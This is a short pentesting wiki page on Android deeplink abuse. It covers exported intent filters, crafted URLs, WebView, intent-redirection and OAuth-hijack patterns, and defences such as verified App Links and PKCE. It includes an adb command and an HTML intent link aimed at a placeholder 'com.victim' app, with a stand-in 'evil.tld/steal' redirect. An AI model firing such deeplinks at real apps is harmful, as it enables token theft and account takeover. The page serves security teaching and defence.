---
title: Android deeplink abuse
slug: android-deeplink-abuse
---

> **TL;DR:** Apps register custom schemes or App Links that map URLs to internal activities; unvalidated extras and WebView passthrough turn a single click into account takeover, file read or XSS-in-WebView.

## What it is
Deeplinks are intent filters that bind URIs (`myapp://...`, `https://app.example.com/...`) to specific activities. When a browser, another app, or an SMS opens the URL, Android delivers an Intent containing the URL and any path/query parameters. If the handler trusts those parameters — passing them to a WebView, an authentication token endpoint, or a file API — the deeplink becomes a remote attack vector.

## Preconditions / where it applies
- Activity declares `<intent-filter>` with `<data android:scheme="..."/>` and is exported
- For `android:autoVerify="true"` App Links, the verification host either is not yours or returns a misconfigured `assetlinks.json` so the scheme falls back to a chooser
- Handler reuses URL data unsafely (WebView, Intent forwarding, token validation, file open)

## Technique
1. Extract every `<data>` block from [[android-manifest-analysis]] to list reachable schemes/hosts/paths.
2. Identify the target activity and trace `getIntent().getData()` / `Uri.getQueryParameter(...)` consumers.
3. Craft a URL and trigger it from any context that can open intents (browser, second app, NFC tag, QR code).

```bash
# Fire a custom-scheme deeplink directly
adb shell am start -W -a android.intent.action.VIEW \
  -d "myapp://profile?next=https://evil.tld/steal&token=AAA" \
  com.victim
```

```html
<!-- Browser-based delivery (works against http(s) intent filters or via intent: URI) -->
<a href="intent://x/y?z=1#Intent;scheme=myapp;package=com.victim;end">go</a>
```

Patterns that pay:
- WebView load: `webView.loadUrl(uri.getQueryParameter("url"))` → XSS / token theft via JS bridge (`@JavascriptInterface`).
- Intent redirection: handler builds a new Intent from a URL extra and calls `startActivity` — leads to launching un-exported internal activities under the app's identity.
- OAuth callback hijack: a second app registers the same `redirect_uri` scheme; without App Links verification both apps receive the auth code (Android resolves via chooser or first-installed).
- File read: `ContentResolver.openInputStream(uri)` on attacker-controlled URI returns arbitrary `content://` or `file://` data.

## Detection and defence
- Prefer verified App Links (HTTPS + `assetlinks.json`) over custom schemes; reject the fallback path
- Allow-list hosts/schemes before loading anything into a WebView; disable `setJavaScriptEnabled` and `@JavascriptInterface` unless required
- Never `startActivity` on an Intent reconstructed from URL parameters without `setPackage(getPackageName())`
- Use PKCE for OAuth so a stolen `code` is unusable without the verifier
- See [[android-components]] for the exported-surface baseline

## References
- [Android App Links](https://developer.android.com/training/app-links) — verification model
- [HackTricks – Deep Links](https://book.hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/deep-links.html) — exploitation patterns
- [OAuth 2.0 for Native Apps (RFC 8252)](https://datatracker.ietf.org/doc/html/rfc8252) — PKCE + redirect-URI rules
